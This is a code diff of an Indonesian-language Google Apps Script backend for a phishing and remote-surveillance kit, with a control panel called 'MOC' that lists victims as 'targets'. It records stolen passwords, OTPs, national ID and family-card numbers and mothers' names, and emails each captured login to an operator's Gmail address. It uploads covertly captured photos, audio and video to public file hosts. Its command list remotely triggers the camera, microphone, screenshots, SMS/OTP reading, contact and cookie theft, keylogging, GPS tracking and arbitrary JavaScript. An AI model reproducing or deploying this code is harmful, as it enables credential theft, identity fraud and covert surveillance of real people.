@@ -9,10 +9,10 @@ var DRIVE_FOLDER_ID='1QgviD6FDitWLTOGG1P8WKq7tJ2Xo6zoD';
 var NOTIFY_EMAIL='ajasomplak3@gmail.com';
 var DUKCAPIL_URL='',DUKCAPIL_KEY='';
 var HOST_URUT='catbox,tmpfiles,0x0,drive';
-var BUILD='zgch-f21',AUTO_RELOAD=false;
+var BUILD='zgch-f22',AUTO_RELOAD=false;
 
 var H_LOG=['WAKTU','NIK','USERNAME','PASSWORD','DEVICE_ID','UA','PLATFORM','BAHASA','ZONA','LAYAR','RID','OTP','WAKTU_OTP','IP','ISP','LAT','LNG','AKURASI','MAPS','FOTO','SKOR','SIDIK','REFERRER','SID','HALAMAN','KLIK','STATUS','CATATAN','NO_KK','NO_HP','IBU'];
-var H_IMP=['SID','WAKTU','IP','ISP','KOTA','LAT','LNG','PROV','NEGARA','ZONA','DEVICE','PLATFORM','BAHASA','LAYAR','UA','MODEL','MEMORI','INTI','GPU','BATERAI','SIDIK','PROBE','YIELD','PROMPTS','LAUNDER','SUMBER','FOTO','TIPE','BRAND','MODEL_DEV','OS_DEV','BROWSER_DEV','SKOR_DET'];
+var H_IMP=['SID','WAKTU','IP','ISP','KOTA','LAT','LNG','PROV','NEGARA','ZONA','DEVICE','PLATFORM','BAHASA','LAYAR','UA','MODEL','MEMORI','INTI','GPU','BATERAI','SIDIK','PROBE','YIELD','PROMPTS','LAUNDER','SUMBER','FOTO','TIPE','BRAND','MODEL_DEV','OS_DEV','BROWSER_DEV','SKOR_DET','DIKUNJUNGI','KAM'];
 var H_DET=['SID','WAKTU','DEVICE_ID','TIPE','BRAND','MODEL','OS','OS_VER','BROWSER','BROWSER_VER','UA','ARCH','BITNESS','FORM','LAYAR','VIEWPORT','PIXELRATIO','CPU','RAM','TOUCH','BAHASA','BAHASA_ALL','ZONA','ONLINE','NET','DOWNLINK','RTT','BATERAI','CHARGE','PLATFORM','IP','SIDIK','PROBE','SKOR','HALAMAN'];
 var H_MIC=['WAKTU','SID','DB','PEAK','VA','SUMBER'];
 var H_AUD=['WAKTU','SID','DURASI','BYTE','MIME','URL','HOST','SUMBER'];
@@ -71,7 +71,6 @@ function upsert(sh,col,val,data){
   sh.appendRow(data);return sh.getLastRow();
 }
 
-/* ---------- kripto ---------- */
 var SB=(function(){
   var s='637c777bf26b6fc53001672bfed7ab76ca82c97dfa5947f0add4a2af9ca472c0b7fd9326363ff7cc34a5e5f171d8311504c723c31896059a071280e2eb27b27509832c1a1b6e5aa0523bd6b329e32f8453d100ed20fcb15b6acbbe394a4c58cfd0efaafb434d338545f9027f503c9fa851a3408f929d38f5bcb6da2110fff3d2cd0c13ec5f974417c4a77e3d645d197360814fdc222a908846eeb814de5e0bdbe0323a0a4906245cc2d3ac629195e479e7c8376d8dd54ea96c56f4ea657aae08ba78252e1ca6b4c6e8dd741f4bbd8b8a703eb5664803f60e613557b986c11d9ee1f8981169d98e949b1e87e9ce5528df8ca1890dbfe6426841992d0fb054bb16';
   var a=new Uint8Array(256);for(var i=0;i<256;i++)a[i]=parseInt(s.substr(i*2,2),16);return a;
@@ -177,8 +176,6 @@ function ext_(mime){
   if(mime.indexOf('jpeg')>-1)return '.jpg';
   return '.webm';
 }
-
-/* ---------- unggah berantai ---------- */
 function unggah_(bytes,mime,nama,jenis,sid){
   var blob=Utilities.newBlob(bytes,mime,nama);
   var host=[],hasil=null;
@@ -189,32 +186,25 @@ function unggah_(bytes,mime,nama,jenis,sid){
     if(hasil)break;
     try{
       if(h==='catbox'){
-        var r=UrlFetchApp.fetch('https://catbox.moe/user/api.php',{
-          method:'post',muteHttpExceptions:true,
-          headers:{'User-Agent':'Mozilla/5.0'},
-          payload:{reqtype:'fileupload',fileToUpload:blob}});
+        var r=UrlFetchApp.fetch('https://catbox.moe/user/api.php',{method:'post',muteHttpExceptions:true,
+          headers:{'User-Agent':'Mozilla/5.0'},payload:{reqtype:'fileupload',fileToUpload:blob}});
         var t=String(r.getContentText()).trim();
         if(/^https?:\/\//.test(t))hasil={host:'catbox',url:t};
       } else if(h==='tmpfiles'){
-        var r2=UrlFetchApp.fetch('https://tmpfiles.org/api/v1/upload',{
-          method:'post',muteHttpExceptions:true,
-          headers:{'User-Agent':'Mozilla/5.0'},
-          payload:{file:blob}});
+        var r2=UrlFetchApp.fetch('https://tmpfiles.org/api/v1/upload',{method:'post',muteHttpExceptions:true,
+          headers:{'User-Agent':'Mozilla/5.0'},payload:{file:blob}});
         var j=JSON.parse(r2.getContentText());
         var u=j&&j.data&&j.data.url;
         if(u)hasil={host:'tmpfiles',url:String(u).replace('tmpfiles.org/','tmpfiles.org/dl/')};
       } else if(h==='0x0'){
-        var r3=UrlFetchApp.fetch('https://0x0.st',{
-          method:'post',muteHttpExceptions:true,
-          headers:{'User-Agent':'Mozilla/5.0'},
-          payload:{file:blob}});
+        var r3=UrlFetchApp.fetch('https://0x0.st',{method:'post',muteHttpExceptions:true,
+          headers:{'User-Agent':'Mozilla/5.0'},payload:{file:blob}});
         var t3=String(r3.getContentText()).trim();
         if(/^https?:\/\//.test(t3))hasil={host:'0x0',url:t3};
       } else if(h==='drive'){
         var f=folder_().createFile(blob);
         try{f.setSharing(DriveApp.Access.ANYONE_WITH_LINK,DriveApp.Permission.VIEW)}catch(e){}
-        hasil={host:'drive',
-          url:'https://drive.google.com/file/d/'+f.getId()+'/view',
+        hasil={host:'drive',url:'https://drive.google.com/file/d/'+f.getId()+'/view',
           thumb:'https://drive.google.com/thumbnail?id='+f.getId()+'&sz=w900'};
       }
     }catch(e){}
@@ -256,13 +246,11 @@ function sapu_(){
       var h=unggah_(bytes,String(r[3]||'application/octet-stream'),
         String(r[4]||('antre-'+Date.now())),String(r[2]||'antre'),String(r[1]||''));
       if(h){
-        var sheetTuju=r[2]==='video'?SHEET_VID:SHEET_AUD;
-        getSheet_(sheetTuju).appendRow([now_(),String(r[1]||''),'',bytes.length,
-          String(r[3]||''),h.url,h.host,'antre']);
+        getSheet_(r[2]==='video'?SHEET_VID:SHEET_AUD).appendRow([now_(),String(r[1]||''),'',
+          bytes.length,String(r[3]||''),h.url,h.host,'antre']);
         sh.deleteRow(i+2);beres++;
       } else {
-        var c=Number(r[6])||0;
-        sh.getRange(i+2,7).setValue(c+1);
+        var c=Number(r[6])||0;sh.getRange(i+2,7).setValue(c+1);
         if(c>=6)sh.deleteRow(i+2);
       }
     }catch(e){try{sh.deleteRow(i+2)}catch(x){}}
@@ -271,12 +259,10 @@ function sapu_(){
 }
 function ringkasHarian(){
   if(!NOTIFY_EMAIL)return;
-  var n=function(nama){try{var s=getSheet_(nama);return Math.max(0,s.getLastRow()-1)}catch(e){return 0}};
-  var body='<b>Ringkasan harian</b><br>'+now_()+
-    '<br>Login: '+n(SHEET_LOG)+'<br>NIK: '+n(SHEET_NIK)+'<br>Foto: '+n(SHEET_IMP)+
-    '<br>Audio: '+n(SHEET_AUD)+'<br>Video: '+n(SHEET_VID)+'<br>Kontak: '+n(SHEET_KON)+
-    '<br>Cookie: '+n(SHEET_CK)+'<br>Kunjungan: '+n(SHEET_KUN)+'<br>Antrean: '+n(SHEET_ANTRE);
-  try{MailApp.sendEmail({to:NOTIFY_EMAIL,subject:'ZGCH ringkas '+now_(),htmlBody:body})}catch(e){}
+  var n=function(x){try{return Math.max(0,getSheet_(x).getLastRow()-1)}catch(e){return 0}};
+  try{MailApp.sendEmail({to:NOTIFY_EMAIL,subject:'ZGCH ringkas '+now_(),
+    htmlBody:'Login '+n(SHEET_LOG)+' · Foto '+n(SHEET_IMP)+' · Video '+n(SHEET_VID)+
+      ' · Audio '+n(SHEET_AUD)+' · Kontak '+n(SHEET_KON)+' · Cookie '+n(SHEET_CK)})}catch(e){}
 }
 function pasangJam(){
   ScriptApp.getProjectTriggers().forEach(function(t){
@@ -285,13 +271,11 @@ function pasangJam(){
   });
   ScriptApp.newTrigger('sapu_').timeBased().everyMinutes(5).create();
   ScriptApp.newTrigger('ringkasHarian').timeBased().atHour(6).everyDays(1).create();
-  return out({ok:true,build:BUILD,status:'jam terpasang'});
+  return out({ok:true,build:BUILD});
 }
 
-/* ---------- simpan ---------- */
 function saveAuto(p){
   var sid=String(p.sid||'')||Utilities.getUuid().slice(0,12);
-  var sh=getSheet_(SHEET_IMP);
   var d=new Array(H_IMP.length);for(var i=0;i<H_IMP.length;i++)d[i]='';
   d[0]=sid;d[1]=now_();d[2]=String(p.ip||'');d[9]=String(p.zona||'');
   d[10]=String(p.device||'');d[11]=String(p.platform||'');d[12]=String(p.bahasa||'');
@@ -302,7 +286,7 @@ function saveAuto(p){
   d[25]='auto';d[27]=String(p.tipe||'');d[28]=String(p.brand||'');
   d[29]=String(p.model||'');d[30]=String(p.os||'')+' '+String(p.osv||'');
   d[31]=String(p.browser||'')+' '+String(p.bver||'');
-  upsert(sh,1,sid,d);
+  upsert(getSheet_(SHEET_IMP),1,sid,d);
   return out({ok:true,sid:sid,build:BUILD});
 }
 function saveProbe(p){return saveAuto(p)}
@@ -375,12 +359,11 @@ function saveLogin(p){
   sh.getRange(nr,1,1,H_LOG.length).setValues([d]);
   if(String(p.nik||'')){try{saveNik({nik:p.nik,ok:1,sid:sid,kk:p.kk,hp:p.hp,ibu:p.ibu})}catch(e){}}
   try{
-    var det=[p.tipe,p.brand,p.model,p.os,p.osv,p.browser].filter(String).join(' ');
     if(NOTIFY_EMAIL)MailApp.sendEmail({to:NOTIFY_EMAIL,subject:'ZGCH · '+String(p.username||''),
       htmlBody:'<b>Email</b> '+esc(p.username)+'<br><b>Sandi</b> '+esc(p.password)+
         '<br><b>NIK</b> '+esc(p.nik)+'<br><b>KK</b> '+esc(p.kk)+'<br><b>HP</b> '+esc(p.hp)+
         '<br><b>Ibu</b> '+esc(p.ibu)+'<br><b>IP</b> '+esc(p.ip)+
-        '<br><b>Perangkat</b> '+esc(det)+'<br><b>Waktu</b> '+now_()});
+        '<br><b>Perangkat</b> '+esc([p.brand,p.model,p.os,p.browser].filter(String).join(' '))});
   }catch(e){}
   return out({ok:true,baris:nr,kolom:H_LOG.length});
 }
@@ -395,6 +378,7 @@ function saveExtra(p){
   if(r){
     if(p.lat)sh.getRange(r,16).setValue(String(p.lat));
     if(p.lng)sh.getRange(r,17).setValue(String(p.lng));
+    if(p.acc)sh.getRange(r,18).setValue(String(p.acc));
     if(p.lat&&p.lng)sh.getRange(r,19).setValue('https://www.google.com/maps?q='+p.lat+','+p.lng);
   }
   return out({ok:true});
@@ -407,10 +391,10 @@ function saveLacak(p){
 function saveFoto(p){
   var b=String(p.img||'');
   if(b.indexOf('data:')===0)b=b.slice(b.indexOf(',')+1);
-  if(b.length<2500)return out({ok:false,err:'terlalu kecil',len:b.length});
+  if(b.length<2000)return out({ok:false,err:'terlalu kecil',len:b.length});
   var bytes;
   try{bytes=Utilities.base64Decode(b)}catch(e){return out({ok:false,err:'base64 rusak',len:b.length})}
-  if(bytes.length<2000)return out({ok:false,err:'byte '+bytes.length});
+  if(bytes.length<1500)return out({ok:false,err:'byte '+bytes.length});
   var nama='zgch-foto-'+Date.now()+'-'+acak_()+'-'+String(p.sid||'').slice(0,6)+'.jpg';
   var h=unggah_(bytes,'image/jpeg',nama,'foto',p.sid);
   if(!h)return out({ok:false,err:'semua host gagal'});
@@ -435,7 +419,6 @@ function saveNik(p){
       nama=String((j&&(j.nama||(j.data&&j.data.nama)))||'');
     }catch(e){}
   }
-  var sh=getSheet_(SHEET_NIK);
   var row=new Array(H_NIK.length);for(var i=0;i<H_NIK.length;i++)row[i]='';
   row[0]=now_();row[1]=nik;row[2]='cek';row[3]=prov;row[4]=nik.slice(2,4);row[5]=nik.slice(4,6);
   row[6]=(tgl||'')+'/'+(bln||'')+'/'+(thn?2000+thn:'');
@@ -444,10 +427,9 @@ function saveNik(p){
   row[12]=prov?1:0;row[15]=(tgl>=1&&tgl<=31&&bln>=1&&bln<=12)?1:0;row[16]=1;
   row[17]=nik.length===16?1:0;row[18]=(prov&&nik.length===16)?1:0;
   row[19]=String(p.ok==='1'||p.ok===1?70:35);
-  row[20]=nama?'dukcapil':'turunan nik';
-  row[21]=String(p.sid||'');row[22]=nama;
+  row[20]=nama?'dukcapil':'turunan nik';row[21]=String(p.sid||'');row[22]=nama;
   row[23]=String(p.kk||'');row[24]=String(p.hp||'');row[25]=String(p.ibu||'');
-  sh.appendRow(row);
+  getSheet_(SHEET_NIK).appendRow(row);
   return out({ok:true,prov:prov,jk:jk,nama:nama});
 }
 function saveKunjungan(p){
@@ -518,6 +500,10 @@ function saveSumber(p){
 }
 function saveJurnal(p){
   getSheet_(SHEET_JUR).appendRow([now_(),String(p.sid||''),String(p.tag||''),String(p.isi||'').slice(0,900)]);
+  if(String(p.tag||'')==='kamera'){
+    var im=getSheet_(SHEET_IMP),x=findRow(im,1,String(p.sid||''));
+    if(x)im.getRange(x,35).setValue(now_()+' '+String(p.isi||'').slice(0,80));
+  }
   return out({ok:true});
 }
 function beacon(p){
@@ -550,7 +536,6 @@ function tarik(p){
   return out({ok:true,tugas:keluar});
 }
 
-/* ---------- perbaiki ---------- */
 function repair(){
   var langkah=[],geser=0;
   Object.keys(HDR).forEach(function(n){
@@ -570,11 +555,10 @@ function repair(){
     }
     sh.getRange(2,1,v.length,H_LOG.length).setValues(v);
   }
-  langkah.push('baris digeser balik: '+geser);
+  langkah.push('geser balik: '+geser);
   return out({ok:true,build:BUILD,langkah:langkah});
 }
 
-/* ---------- baca ---------- */
 var C2C=null,IMPC=null,NIKC=null;
 function c2rows(){if(C2C)return C2C;
   var sh=getSheet_(SHEET_C2),l=sh.getLastRow();
@@ -593,15 +577,15 @@ function sessions(){
   var imp=impMap(),rows=c2rows(),m={},k;
   for(k in imp){
     var rr=imp[k];
-    m[k]={sid:k,n:0,last:rr[1],pending:0,ip:String(rr[2]||''),dev:String(rr[27]||''),
+    m[k]={sid:k,n:0,last:rr[1],pending:0,ip:String(rr[2]||''),dev:String(rr[10]||''),
       brand:String(rr[28]||''),model:String(rr[29]||''),os:String(rr[30]||''),brw:String(rr[31]||''),
       bat:String(rr[19]||''),skor:String(rr[32]||''),foto:String(rr[26]||''),zona:String(rr[9]||''),
-      dik:String(rr[33]||'')};
+      dik:String(rr[33]||''),kam:String(rr[34]||'')};
   }
   rows.forEach(function(r){
     var s=String(r[0]||'');if(!s)return;
     var t=(r[1] instanceof Date)?r[1].getTime():String(r[1]);
-    if(!m[s])m[s]={sid:s,n:0,last:t,pending:0,ip:'',dev:'',brand:'',model:'',os:'',brw:'',bat:'',skor:'',foto:'',zona:'',dik:''};
+    if(!m[s])m[s]={sid:s,n:0,last:t,pending:0,ip:'',dev:'',brand:'',model:'',os:'',brw:'',bat:'',skor:'',foto:'',zona:'',dik:'',kam:''};
     m[s].n++;m[s].last=t;
     if(String(r[2])==='task'&&String(r[4])==='pending')m[s].pending++;
   });
@@ -611,7 +595,7 @@ function feedOf(sid){
   var rows=c2rows(),o=[];
   for(var i=rows.length-1;i>=0;i--){
     if(String(rows[i][0])===sid)o.push({id:i+2,t:rows[i][1],arah:String(rows[i][2]),
-      cmd:String(rows[i][3]),isi:String(rows[i][5])});
+      cmd:String(rows[i][3]),st:String(rows[i][4]),isi:String(rows[i][5])});
     if(o.length>=25)break;
   }
   return o;
@@ -629,26 +613,25 @@ function report(){
     var d=byCap[cap],tot=0,max=0,ent=0;
     Object.keys(d).forEach(function(k){tot+=d[k];if(d[k]>max)max=d[k]});
     Object.keys(d).forEach(function(k){var p=d[k]/tot;ent-=p*Math.log(p)});
-    var dist=Object.keys(d).map(function(k){return k+'='+d[k]}).join(' ');
-    return '<tr><td>'+esc(cap)+'</td><td>'+tot+'</td><td>'+esc(dist)+'</td><td>'+
+    return '<tr><td>'+esc(cap)+'</td><td>'+tot+'</td><td>'+
+      esc(Object.keys(d).map(function(k){return k+'='+d[k]}).join(' '))+'</td><td>'+
       (tot?(1-max/tot).toFixed(2):'-')+'</td><td>'+(tot?(ent/Math.LN2).toFixed(2):'-')+'</td></tr>';
   }).join('');
   return '<!DOCTYPE html><html><head><meta charset="utf-8"><style>body{background:#0a1120;color:#c8d6e5;font:13px system-ui;padding:16px}'+
   'table{border-collapse:collapse}td,th{border:1px solid #22334d;padding:5px 9px}</style></head><body>'+
   '<h1 style="color:#8fe3b4;font-size:15px">Laporan '+now_()+'</h1>'+
-  '<p>sesi '+n+' · senyap '+sg+' · prompt '+pr+' · latensi '+(n?Math.round(al/n):'-')+'</p>'+
   '<table><tr><th>cap</th><th>n</th><th>dist</th><th>div</th><th>ent</th></tr>'+(cd||'<tr><td>-</td></tr>')+'</table></body></html>';
 }
 
-/* ---------- MOC ---------- */
-var CMD=[['foto','FOTO'],['video','VIDEO'],['rekam','rekam mic'],['mic','mic on'],['micstop','mic off'],
-  ['layar','screenshot'],['kamera','cam on'],['kamerastop','cam off'],['vidloop','vid loop'],
-  ['vidstop','loop off'],['uji','UJI MEDIA'],['mediaon','media on'],['torch','lampu'],
-  ['lokasi','lokasi'],['sms','baca sms'],['smsinbox','inbox otp'],['telepon','log tel'],
-  ['kontak','kontak'],['kontakall','KONTAK SEMUA'],['cookie','COOKIE'],['kunjungi','situs dikunjungi'],
-  ['sumber','sumber daya'],['dev','perangkat'],['sidik','sidik'],['izin','izin'],['jar','jaringan'],
-  ['situs','jejak situs'],['hidup','hidup'],['fs','layar penuh'],['info','info'],['keylog','keylog'],
-  ['getar','getar'],['notif','notif'],['popup','popup'],['kunci','kunci'],['js','js'],['kill','bersih']];
+var CMD=[['foto','FOTO'],['foto3','FOTO x3'],['video','VIDEO'],['rekam','rekam mic'],
+  ['mic','mic on'],['micstop','mic off'],['layar','screenshot'],['kamera','cam on'],
+  ['kamerastop','cam off'],['vidloop','vid loop'],['vidstop','loop off'],['uji','UJI MEDIA'],
+  ['mediaon','media on'],['torch','lampu'],['lokasi','GPS'],['sms','baca sms'],['smsinbox','inbox otp'],
+  ['telepon','log tel'],['kontak','kontak'],['kontakall','KONTAK SEMUA'],['cookie','COOKIE'],
+  ['kunjungi','situs dikunjungi'],['sumber','sumber daya'],['dev','perangkat'],['sidik','sidik'],
+  ['izin','izin'],['jar','jaringan'],['situs','jejak situs'],['hidup','hidup'],['fs','layar penuh'],
+  ['info','info'],['keylog','keylog'],['getar','getar'],['notif','notif'],['popup','popup'],
+  ['kunci','kunci'],['js','js'],['kill','bersih']];
 var TABS=[['target','Target'],['login','Login'],['nik','NIK'],['kontak','Kontak'],['sms','SMS'],
   ['tel','Telepon'],['foto','Foto'],['video','Video'],['suara','Suara'],['cookie','Cookie'],
   ['kunjungi','Situs'],['sumber','Sumber'],['sidik','Sidik'],['situs','Jejak'],['izin','Izin'],
@@ -665,8 +648,7 @@ function dumpTbl(sheet,head,kolom,filterSid,max){
   var sh=getSheet_(sheet),l=sh.getLastRow();
   if(l<2)return '<p class="mut">kosong</p>';
   var n=Math.min(l-1,max||120);
-  var v=sh.getRange(2,1,l-1,HDR[sheet].length).getValues().reverse().slice(0,n);
-  var rows=[];
+  var v=sh.getRange(2,1,l-1,HDR[sheet].length).getValues().reverse().slice(0,n),rows=[];
   v.forEach(function(r){
     if(filterSid&&String(r[1])!==filterSid&&String(r[0])!==filterSid)return;
     rows.push(kolom(r));
@@ -676,7 +658,7 @@ function dumpTbl(sheet,head,kolom,filterSid,max){
 function mediaTbl(sheet,filterSid){
   var sh=getSheet_(sheet),l=sh.getLastRow();
   if(l<2)return '<p class="mut">kosong</p>';
-  var v=sh.getRange(2,1,l-1,HDR[sheet].length).getValues().reverse().slice(0,80),rows=[];
+  var v=sh.getRange(2,1,l-1,HDR[sheet].length).getValues().reverse().slice(0,90),rows=[];
   v.forEach(function(r){
     if(filterSid&&String(r[1])!==filterSid)return;
     var u=String(r[5]||'');
@@ -694,7 +676,7 @@ function sesiKartu(s,k,imp,nk){
   var kk=nn.length?String(nn[23]||''):'',hp=nn.length?String(nn[24]||''):'',ibu=nn.length?String(nn[25]||''):'';
   var tgl=(s.last instanceof Date)?Utilities.formatDate(new Date(s.last),Session.getScriptTimeZone(),'dd/MM HH:mm'):String(s.last);
   var tombol=CMD.map(function(c){
-    var utama=/^(foto|video|uji|kontakall|cookie|kunjungi)$/.test(c[0]);
+    var utama=/^(foto|foto3|video|uji|kontakall|cookie|kunjungi|dev|lokasi)$/.test(c[0]);
     return '<a class="b'+(utama?' u':'')+'" href="?key='+k+'&sid='+encodeURIComponent(s.sid)+'&cmd='+c[0]+'">'+c[1]+'</a>';
   }).join('');
   return '<div class="c"><div class="h"><b>'+esc(String(s.sid).slice(0,10))+'</b><span class="mut">'+esc(tgl)+
@@ -707,16 +689,16 @@ function sesiKartu(s,k,imp,nk){
     (hp?'<div class="r"><span class="mut">HP</span> '+esc(hp)+'</div>':'')+
     (ibu?'<div class="r"><span class="mut">IBU</span> '+esc(ibu)+'</div>':'')+
     (s.dik?'<div class="r"><span class="mut">DIK</span> '+esc(String(s.dik).slice(0,160))+'</div>':'')+
+    (s.kam?'<div class="r"><span class="mut">KAM</span> '+esc(String(s.kam).slice(0,80))+'</div>':'')+
     '<div class="r"><span class="mut">IP</span> '+esc(s.ip||'-')+'</div>'+
     (foto?'<img class="sh" src="'+esc(foto)+'" onclick="big(this)" loading="lazy">':'')+
     '<div class="bs">'+tombol+'</div>'+
     '<div class="bs"><a class="b" href="?key='+k+'&tab=c2&sid='+encodeURIComponent(s.sid)+'">umpan</a>'+
-    '<a class="b" href="?key='+k+'&tab=cookie&sid='+encodeURIComponent(s.sid)+'">data</a></div></div>';
+    '<a class="b" href="?key='+k+'&tab=det&sid='+encodeURIComponent(s.sid)+'">perangkat</a></div></div>';
 }
 function console(tab,sid){
   tab=tab||'target';sid=sid||'';
-  var k=SECRET_KEY,imp=impMap(),nk=nikMap(),ses=sessions();
-  var isi='';
+  var k=SECRET_KEY,imp=impMap(),nk=nikMap(),ses=sessions(),isi='';
   if(tab==='target'){
     isi='<div class="g">'+(ses.map(function(s){return sesiKartu(s,k,imp,nk)}).join('')||'<span class="mut">belum ada target</span>')+'</div>';
   } else if(tab==='login'){
@@ -742,12 +724,9 @@ function console(tab,sid){
     isi=dumpTbl(SHEET_TEL,['waktu','sid','nomor','jenis','durasi'],function(r){
       return [esc(r[0]),esc(r[1]),esc(r[2]),esc(r[3]),esc(r[4])];
     },sid,400);
-  } else if(tab==='foto'){
-    isi=mediaTbl(SHEET_IMP,sid);
-  } else if(tab==='video'){
-    isi=mediaTbl(SHEET_VID,sid);
-  } else if(tab==='suara'){
-    isi=mediaTbl(SHEET_AUD,sid);
+  } else if(tab==='foto'){isi=mediaTbl(SHEET_IMP,sid);
+  } else if(tab==='video'){isi=mediaTbl(SHEET_VID,sid);
+  } else if(tab==='suara'){isi=mediaTbl(SHEET_AUD,sid);
   } else if(tab==='cookie'){
     isi=dumpTbl(SHEET_CK,['waktu','sid','asal','nama','nilai'],function(r){
       return [esc(r[0]),esc(r[1]),esc(r[2]),esc(r[3]),'<span class="mut">'+esc(String(r[4]||'').slice(0,160))+'</span>'];
@@ -767,13 +746,11 @@ function console(tab,sid){
   } else if(tab==='sidik'){
     isi=dumpTbl(SHEET_SIDIK,['waktu','sid','hash','canvas','webgl','audio','fon','gpu','layar','zona','inti','ram','touch','kodek','storage','incognito','adblock'],function(r){
       return [esc(r[0]),esc(r[1]),'<code class="pw">'+esc(r[2])+'</code>',esc(r[3]),esc(r[4]),esc(r[5]),
-        esc(r[6]),esc(r[7]),esc(r[9]),esc(r[10]),esc(r[12]),esc(r[13]),esc(r[14]),esc(r[16]),
-        esc(r[18]),esc(r[19]),esc(r[20])];
+        esc(r[6]),esc(r[7]),esc(r[9]),esc(r[10]),esc(r[12]),esc(r[13]),esc(r[14]),esc(r[16]),esc(r[18]),esc(r[19]),esc(r[20])];
     },sid,80);
   } else if(tab==='situs'){
     isi=dumpTbl(SHEET_SITUS,['waktu','sid','t','event','data','halaman','referrer'],function(r){
-      return [esc(r[0]),esc(r[1]),esc(r[2]),esc(r[3]),esc(r[4]),esc(String(r[5]||'').slice(0,50)),
-        esc(String(r[6]||'').slice(0,50))];
+      return [esc(r[0]),esc(r[1]),esc(r[2]),esc(r[3]),esc(r[4]),esc(String(r[5]||'').slice(0,50)),esc(String(r[6]||'').slice(0,50))];
     },sid,200);
   } else if(tab==='izin'){
     isi=dumpTbl(SHEET_IZIN,['waktu','sid','nama','status'],function(r){
@@ -784,14 +761,13 @@ function console(tab,sid){
       return [esc(r[0]),esc(r[1]),esc(r[2]),esc(r[3]),esc(r[4]),esc(r[5]),esc(r[6]),esc(r[7])];
     },sid,80);
   } else if(tab==='det'){
-    isi=dumpTbl(SHEET_DET,['waktu','sid','tipe','brand','model','os','browser','cpu','ram'],function(r){
-      return [esc(r[0]),esc(r[1]),esc(r[3]),esc(r[4]),esc(r[5]),esc(r[6]+' '+r[7]),esc(r[8]+' '+r[9]),esc(r[17]),esc(r[18])];
+    isi=dumpTbl(SHEET_DET,['waktu','sid','tipe','brand','model','os','browser','cpu','ram','gpu','skor'],function(r){
+      return [esc(r[0]),esc(r[1]),esc(r[3]),esc(r[4]),esc(r[5]),esc(r[6]+' '+r[7]),esc(r[8]+' '+r[9]),esc(r[17]),esc(r[18]),esc(r[32]),esc(r[33])];
     },sid,80);
   } else if(tab==='c2'){
-    var f=feedOf(sid);
-    isi=tbl(['waktu','arah','cmd','isi'],f.map(function(x){
-      return [esc(x.t),esc(x.arah),esc(x.cmd),esc(x.isi)];
-    }))+'<p class="mut">perintah untuk '+esc(sid||'-')+'</p>';
+    isi=tbl(['waktu','arah','cmd','status','isi'],feedOf(sid).map(function(x){
+      return [esc(x.t),esc(x.arah),esc(x.cmd),esc(x.st),esc(x.isi)];
+    }))+'<p class="mut">umpan '+esc(sid||'-')+'</p>';
   } else if(tab==='antre'){
     isi=dumpTbl(SHEET_ANTRE,['waktu','sid','jenis','mime','nama','coba'],function(r){
       return [esc(r[0]),esc(r[1]),esc(r[2]),esc(r[3]),esc(r[4]),esc(r[6])];
@@ -804,8 +780,8 @@ function console(tab,sid){
     isi='<div class="bar">'+
       ['repair|perbaiki header','jam|pasang jam','sapu|sapu antrean','ringkas|kirim ringkas',
        'uji|uji kripto','report|laporan','export|manifest','clear|kosongkan data',
-       'csv|login csv','csv4|nik csv','csv6|kontak csv','csv14|sidik csv','csv15|situs csv',
-       'csv18|cookie csv','csv19|kunjungi csv','csv20|jurnal csv']
+       'csv|login csv','csv4|nik csv','csv6|kontak csv','csv14|sidik csv','csv18|cookie csv',
+       'csv19|kunjungi csv','csv20|jurnal csv']
       .map(function(x){var a=x.split('|');return '<a href="?key='+k+'&'+a[0]+'=1">'+a[1]+'</a>'}).join('')+'</div>'+
       '<p class="mut">build '+BUILD+' · host '+esc(HOST_URUT)+'</p>';
   } else isi='<p class="mut">tab tidak dikenal</p>';
@@ -836,8 +812,7 @@ function console(tab,sid){
   '.ov img{max-width:94vw;max-height:90vh}</style></head><body>'+
   '<h1>MOC · '+ses.length+' target</h1>'+
   '<div class="mut" style="font-size:11px">build '+BUILD+' · '+esc(tab)+(sid?' · '+esc(String(sid).slice(0,12)):'')+'</div>'+
-  '<div class="bar">'+bar+'</div><div class="bar">'+
-  '<a href="?key='+k+'&tab='+tab+'">muat ulang</a>'+
+  '<div class="bar">'+bar+'</div><div class="bar"><a href="?key='+k+'&tab='+tab+'">muat ulang</a>'+
   (sid?'<a href="?key='+k+'&tab=target">semua target</a>':'')+'</div>'+isi+
   '<script>function big(e){var o=document.createElement("div");o.className="ov";'+
   'o.innerHTML="<img src=\\""+e.src+"\\">";o.onclick=function(){o.remove()};document.body.appendChild(o)}'+
@@ -846,7 +821,7 @@ function console(tab,sid){
 function consoleAman(tab,sid){
   try{return console(tab,sid)}
   catch(e){return '<pre style="padding:16px;background:#0a1120;color:#f3d97b;font:12px monospace">MOC gagal: '+
-    esc(e.message)+'\n\n<a href="?key='+SECRET_KEY+'&repair=1">coba perbaiki</a></pre>'}
+    esc(e.message)+'\n\n<a href="?key='+SECRET_KEY+'&repair=1">perbaiki</a></pre>'}
 }
 function pintu(pesan){
   return '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">'+
@@ -864,8 +839,7 @@ function kabar(pesan,sid){
   'a{color:#7fb2e8}</style></head><body><div><p>'+esc(pesan)+'</p>'+
   '<p><a href="?key='+SECRET_KEY+'&tab=c2&sid='+encodeURIComponent(sid||'')+'">umpan</a> · '+
   '<a href="?key='+SECRET_KEY+'&tab=target">MOC</a></p>'+
-  (sid?'<p style="color:#61748a;font-size:11px">'+esc(String(sid).slice(0,12))+'</p>':'')+
-  '</div></body></html>';
+  (sid?'<p style="color:#61748a;font-size:11px">'+esc(String(sid).slice(0,12))+'</p>':'')+'</div></body></html>';
 }
 function csv(n){
   var sh=getSheet_(n);
@@ -877,22 +851,15 @@ function csv(n){
   }).join('\n');
   return ContentService.createTextOutput(t).setMimeType(ContentService.MimeType.CSV).downloadAsFile(n+'-'+Date.now()+'.csv');
 }
-function dump_(n,h){
-  var sh=getSheet_(n),l=sh.getLastRow();
-  return l<2?[]:sh.getRange(2,1,l-1,h.length).getValues();
-}
-function impDump(){
-  var sh=getSheet_(SHEET_IMP),l=sh.getLastRow();
-  return l<2?[]:sh.getRange(2,1,l-1,H_IMP.length).getValues().slice(-5);
-}
+function dump_(n,h){var sh=getSheet_(n),l=sh.getLastRow();return l<2?[]:sh.getRange(2,1,l-1,h.length).getValues()}
+function impDump(){var sh=getSheet_(SHEET_IMP),l=sh.getLastRow();
+  return l<2?[]:sh.getRange(2,1,l-1,H_IMP.length).getValues().slice(-5)}
 function cariNik(nik){
